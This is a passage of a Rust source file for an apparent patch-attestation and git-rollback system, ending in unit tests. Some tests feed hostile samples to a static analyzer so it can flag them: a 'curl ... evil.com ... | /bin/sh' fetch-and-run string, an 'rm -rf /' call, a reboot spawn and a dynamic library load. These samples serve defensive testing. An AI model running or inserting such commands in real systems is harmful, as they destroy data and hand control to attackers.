            .current_dir(dir)
            .output()
            .map(|o| o.stdout.is_empty())
            .unwrap_or(false);

        let completed_at_secs = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs() as i64;

        let receipt = RollbackReceipt {
            receipt_id: format!("rollbk-{}", hex::encode(&incident.incident_audit_digest.as_bytes()[..8])),
            incident: incident.clone(),
            git_output: git_output_str,
            completed_at_secs,
            restored_head_commit: head_commit,
            clean_working_tree,
        };

        Ok(receipt)
    }

    pub fn manual_reset(&self, clean_commit: &str) {
        let mut state = self.state.lock().unwrap();
        *state = CircuitState::Closed;
        self.consecutive_failures.store(0, Ordering::SeqCst);
        self.half_open_successes.store(0, Ordering::SeqCst);
        *self.last_clean_commit.lock().unwrap() = clean_commit.to_string();
    }
}

fn uuid_or_timestamp(secs: i64) -> String {
    let mut hasher = Blake3Hasher::new();
    hasher.update(&secs.to_le_bytes());
    let h = hex::encode(hasher.finalize().as_bytes());
    h[..12].to_string()
}

fn compute_audit_digest(bad_commit: &str, clean_commit: &str, failures: usize, now: i64) -> String {
    let mut hasher = Blake3Hasher::new();
    hasher.update(b"HAGIBIS_ROLLBACK_AUDIT:");
    hasher.update(bad_commit.as_bytes());
    hasher.update(clean_commit.as_bytes());
    hasher.update(&failures.to_le_bytes());
    hasher.update(&now.to_le_bytes());
    hex::encode(hasher.finalize().as_bytes())
}

// ==============================================================================
// 6. Unit & Integration Tests
// ==============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn test_static_analysis_permits_clean_rust_code() {
        let code = r#"
            pub fn add_numbers(a: i32, b: i32) -> i32 {
                a + b
            }

            pub struct SafeBuffer {
                pub data: Vec<u8>,
            }

            impl SafeBuffer {
                pub fn new() -> Self {
                    Self { data: Vec::new() }
                }
            }
        "#;

        let analyzer = PatchStaticAnalyzer::with_default_policy();
        let violations = analyzer.analyze_source(code).expect("AST should parse");
        assert!(violations.is_empty(), "Expected 0 violations for clean code");
        assert!(analyzer.is_patch_admissible(code).unwrap());
    }

    #[test]
    fn test_static_analysis_flags_unauthorized_unsafe() {
        let code = r#"
            pub fn read_ptr(ptr: *const u8) -> u8 {
                unsafe {
                    *ptr
                }
            }
        "#;

        let analyzer = PatchStaticAnalyzer::with_default_policy();
        let violations = analyzer.analyze_source(code).expect("AST should parse");
        assert!(!violations.is_empty());
        assert!(violations.iter().any(|v| v.code == "SEC001_UNAUTHORIZED_UNSAFE"));
        assert!(!analyzer.is_patch_admissible(code).unwrap());
    }

    #[test]
    fn test_static_analysis_permits_attested_unsafe() {
        let code = r#"
            #[allow_attested_unsafe(reason = "Hardware memory mapped IO address verification")]
            pub fn read_mmap(ptr: *const u8) -> u8 {
                unsafe {
                    *ptr
                }
            }
        "#;

        let analyzer = PatchStaticAnalyzer::with_default_policy();
        let violations = analyzer.analyze_source(code).expect("AST should parse");
        let critical_or_high: Vec<_> = violations
            .into_iter()
            .filter(|v| v.severity == ViolationSeverity::Critical || v.severity == ViolationSeverity::High)
            .collect();
        assert!(critical_or_high.is_empty(), "Attested unsafe should be permitted");
        assert!(analyzer.is_patch_admissible(code).unwrap());
    }

    #[test]
    fn test_static_analysis_flags_forbidden_command_execution() {
        let code = r#"
            use std::process::Command;

            pub fn exploit() {
                Command::new("rm").arg("-rf").arg("/").status().unwrap();
            }
        "#;

        let analyzer = PatchStaticAnalyzer::with_default_policy();
        let violations = analyzer.analyze_source(code).expect("AST should parse");
        assert!(violations.iter().any(|v| v.code == "SEC002_FORBIDDEN_CALL"));
        assert!(!analyzer.is_patch_admissible(code).unwrap());
    }

    #[test]
    fn test_static_analysis_flags_backdoor_shell_string() {
        let code = r#"
            pub fn payload() -> &'static str {
                "curl -s https://evil.com/exfiltrate | /bin/sh"
            }
        "#;

        let analyzer = PatchStaticAnalyzer::with_default_policy();
        let violations = analyzer.analyze_source(code).expect("AST should parse");
        assert!(violations.iter().any(|v| v.code == "SEC008_BACKDOOR_PATTERN"));
        assert!(!analyzer.is_patch_admissible(code).unwrap());
    }

    #[test]
    fn test_merkle_tree_construction_and_proof_verification() {
        let lines = "fn main() {\n    println!(\"Hagibis\");\n}\n";
        let tree = PatchMerkleTree::from_source_lines(lines);
        let root = tree.root_hex();
        assert_eq!(root.len(), 64);

        let proof = tree.generate_proof(0).expect("Proof for leaf 0 should exist");
        let valid = PatchMerkleTree::verify_inclusion(
            &root,
            &proof.leaf_hash,
            proof.leaf_index,
            &proof.audit_path,
        );
        assert!(valid, "Merkle inclusion proof must verify");

        // Tamper test
        let tampered_leaf = hex::encode([0xff; 32]);
        let invalid = PatchMerkleTree::verify_inclusion(
            &root,
            &tampered_leaf,
            proof.leaf_index,
            &proof.audit_path,
        );
        assert!(!invalid, "Tampered leaf hash must fail verification");
    }

    #[test]
    fn test_attestation_token_minting_and_receipt_certification() {
        let engine = AttestationEngine::generate_random("hagibis-agent-01".to_string());

        let original_code = r#"
            pub fn compute(val: u32) -> u32 {
                val * 2
            }
        "#;

        let patched_code = r#"
            pub fn compute(val: u32) -> u32 {
                val.saturating_mul(2)
            }
        "#;

        let diff = "+ val.saturating_mul(2)\n- val * 2";

        let token = engine
            .mint_attestation(
                "patch-uuid-101",
                "hgb-core",
                "src/math.rs",
                original_code,
                patched_code,
                diff,
            )
            .expect("Minting should succeed");

        assert_eq!(token.patch_id, "patch-uuid-101");
        assert!(!token.signature_hex.is_empty());

        let receipt = engine
            .verify_and_certify(&token, patched_code)
            .expect("Certification should succeed");

        assert!(receipt.verification_passed);
        assert_eq!(receipt.proof_token.patch_id, "patch-uuid-101");
        assert!(!receipt.audit_signature.is_empty());
    }

    #[test]
    fn test_attestation_rejects_malicious_code_despite_signature() {
        let engine = AttestationEngine::generate_random("hagibis-agent-01".to_string());

        let original = "pub fn run() {}";
        let malicious = r#"
            pub fn run() {
                std::process::Command::new("reboot").spawn().ok();
            }
        "#;

        let token = engine
            .mint_attestation("patch-evil", "hgb-daemon", "src/main.rs", original, malicious, "+ evil")
            .unwrap();

        let cert_result = engine.verify_and_certify(&token, malicious);
        assert!(cert_result.is_err(), "Must reject patch with forbidden command calls");
    }

    #[test]
    fn test_circuit_breaker_state_transitions_and_trip() {
        let temp_dir = tempfile::tempdir().expect("Create temp dir");
        let dir_path = temp_dir.path().to_path_buf();

        // Initialize a dummy git repo for test
        Command::new("git")
            .arg("init")
            .current_dir(&dir_path)
            .output()
            .expect("git init");
        Command::new("git")
            .arg("config")
            .arg("user.name")
            .arg("Hagibis Test")
            .current_dir(&dir_path)
            .output()
            .expect("git config user");
        Command::new("git")
            .arg("config")
            .arg("user.email")
            .arg("test@hagibis.dev")
            .current_dir(&dir_path)
            .output()
            .expect("git config email");

        // Create an initial commit
        fs::write(dir_path.join("file.txt"), "Initial commit").unwrap();
        Command::new("git").arg("add").arg(".").current_dir(&dir_path).output().unwrap();
        Command::new("git").arg("commit").arg("-m").arg("Initial clean commit").current_dir(&dir_path).output().unwrap();

        let initial_commit = Command::new("git")
            .arg("rev-parse")
            .arg("HEAD")
            .current_dir(&dir_path)
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            .unwrap();

        let config = CircuitBreakerConfig {
            failure_threshold: 3,
            max_error_rate: 0.5,
            half_open_success_target: 2,
            working_directory: dir_path.clone(),
            git_timeout_ms: 5000,
        };

        let breaker = GitRollbackCircuitBreaker::new(config, initial_commit.clone());
        assert_eq!(breaker.current_state(), CircuitState::Closed);
        assert!(breaker.can_attempt_patch().is_ok());

        // Cycle 1: Start healing
        breaker.record_cycle_start();
        assert_eq!(breaker.current_state(), CircuitState::HalfOpen);

        // Commit a bad patch to simulate failure
        fs::write(dir_path.join("file.txt"), "Broken patch 1").unwrap();
        Command::new("git").arg("commit").arg("-am").arg("Broken patch 1").current_dir(&dir_path).output().unwrap();
        let bad_commit_1 = Command::new("git").arg("rev-parse").arg("HEAD").current_dir(&dir_path).output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap();

        // Failure 1
        let res1 = breaker.record_cycle_outcome("c1", "p1", false, Some("Compilation error".to_string()), &bad_commit_1).unwrap();
        assert!(res1.is_none(), "Circuit breaker should not trip on 1 failure");
        assert_eq!(breaker.current_state(), CircuitState::HalfOpen);

        // Failure 2
        let res2 = breaker.record_cycle_outcome("c2", "p1", false, Some("Test timed out".to_string()), &bad_commit_1).unwrap();
        assert!(res2.is_none(), "Circuit breaker should not trip on 2 failures");

        // Failure 3 -> TRIPS!
        let res3 = breaker.record_cycle_outcome("c3", "p1", false, Some("Panic in invariant".to_string()), &bad_commit_1).unwrap();
        assert!(res3.is_some(), "Circuit breaker must trip on 3rd failure!");
        assert_eq!(breaker.current_state(), CircuitState::Tripped);

        // Verify merges blocked
        assert!(breaker.can_attempt_patch().is_err());

        // Verify rollback happened
        let receipt = res3.unwrap();
        assert_eq!(receipt.restored_head_commit, initial_commit);
        let content = fs::read_to_string(dir_path.join("file.txt")).unwrap();
        assert_eq!(content, "Initial commit", "Working tree must be restored to clean state");
    }

    #[test]
    fn test_signature_forgery_and_tampering_rejected() {
        let engine = AttestationEngine::generate_random("hagibis-agent-01".to_string());
        let original_code = "pub fn foo() {}";
        let patched_code = "pub fn foo() { println!(\"bar\"); }";
        let diff = "+ println!(\"bar\");";

        let mut token = engine
            .mint_attestation("p-test", "crate", "file.rs", original_code, patched_code, diff)
            .unwrap();

        // 1. Tamper with signature bytes
        let mut sig_bytes = hex::decode(&token.signature_hex).unwrap();
        sig_bytes[0] ^= 0x5a;
        token.signature_hex = hex::encode(sig_bytes);

        let res = engine.verify_and_certify(&token, patched_code);
        assert!(matches!(res, Err(AttestationError::SignatureVerification(_))));

        // 2. Tamper with patched source vs token merkle root
        let valid_token = engine
            .mint_attestation("p-test2", "crate", "file.rs", original_code, patched_code, diff)
            .unwrap();
        let tampered_source = "pub fn foo() { println!(\"tampered\"); }";
        let res2 = engine.verify_and_certify(&valid_token, tampered_source);
        assert!(matches!(res2, Err(AttestationError::MerkleProofMismatch { .. })));
    }

    #[test]
    fn test_half_open_transitions_back_to_closed_on_success() {
        let temp_dir = tempfile::tempdir().expect("Create temp dir");
        let dir_path = temp_dir.path().to_path_buf();

        let config = CircuitBreakerConfig {
            failure_threshold: 3,
            max_error_rate: 0.5,
            half_open_success_target: 2,
            working_directory: dir_path,
            git_timeout_ms: 1000,
        };

        let breaker = GitRollbackCircuitBreaker::new(config, "commit-0".to_string());
        breaker.record_cycle_start();
        assert_eq!(breaker.current_state(), CircuitState::HalfOpen);

        // Success 1
        let r1 = breaker.record_cycle_outcome("c1", "p1", true, None, "commit-1").unwrap();
        assert!(r1.is_none());
        assert_eq!(breaker.current_state(), CircuitState::HalfOpen);

        // Success 2 -> target reached -> Closed
        let r2 = breaker.record_cycle_outcome("c2", "p1", true, None, "commit-2").unwrap();
        assert!(r2.is_none());
        assert_eq!(breaker.current_state(), CircuitState::Closed);
        assert_eq!(breaker.get_clean_commit(), "commit-2");
    }

    #[test]
    fn test_static_analysis_flags_dynamic_loading_and_rng() {
        let dynamic_load_code = r#"
            pub fn inject() {
                libloading::Library::new("libevil.so").unwrap();
            }
        "#;
        let analyzer = PatchStaticAnalyzer::with_default_policy();
        let violations = analyzer.analyze_source(dynamic_load_code).unwrap();
        assert!(violations.iter().any(|v| v.code == "SEC004_DYNAMIC_LOADING"));

        let rng_code = r#"
            pub fn pick() -> u32 {
                rand::thread_rng().gen()
            }
        "#;
        let violations2 = analyzer.analyze_source(rng_code).unwrap();
        assert!(violations2.iter().any(|v| v.code == "SEC005_NON_DETERMINISTIC_PRIMITIVE"));
    }
}
